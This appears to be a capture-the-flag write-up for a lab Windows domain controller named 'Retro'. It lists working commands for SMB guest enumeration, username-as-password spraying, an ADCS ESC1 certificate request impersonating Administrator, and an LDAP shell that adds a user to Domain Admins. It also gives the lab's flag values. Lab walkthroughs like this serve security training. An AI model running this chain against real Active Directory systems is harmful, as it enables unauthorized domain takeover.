# Retro — Writeup

**Machine**: Retro | **OS**: Windows Server 2022 | **Difficulty**: Easy

## Chain: SMB Enum → Weak Creds → ADCS ESC1 → LDAP Shell → Domain Admin

### 1. Recon
```
53,88,135,139,389,445,464,593,636,3268,3269,3389,5985  Domain Controller
Domain: retro.vl, DC: dc.retro.vl
```

### 2. SMB Enumeration
```bash
nxc smb retro.vl -u Guest -p "" --shares --rid-brute 1200
# Users: Administrator, Guest, trainee, BANKING$, jburley, tblack
```

### 3. Weak Credentials
```bash
nxc smb retro.vl -u users.txt -p users.txt --continue-on-success
# trainee:trainee ✓
# BANKING$:banking (pre-created machine account)
```

### 4. ADCS ESC1
```bash
certipy find -u 'trainee@retro.vl' -p 'trainee' -dc-ip <ip> -vulnerable
# Vulnerable: RetroClients template (ESC1)
getTGT.py 'retro.vl/BANKING$:banking' -dc-ip <ip>
KRB5CCNAME=./BANKING\$.ccache certipy req -u 'BANKING$@retro.vl' -k -no-pass \
    -ca 'retro-DC-CA' -template 'RetroClients' -upn 'Administrator' \
    -target 'dc.retro.vl' -target-ip <ip> -ns <ip> -dns-tcp
```

### 5. LDAP Shell → Domain Admin
```bash
certipy auth -pfx administrator.pfx -username Administrator -domain retro.vl \
    -dc-ip <ip> -ldap-shell
# add_user_to_group trainee "Domain Admins"
```

### Flags
- **User**: `cbda362cff2099072c5e96c51712ff33`
- **Root**: `40fce9c3f09024bcab29d377ee1ed071`
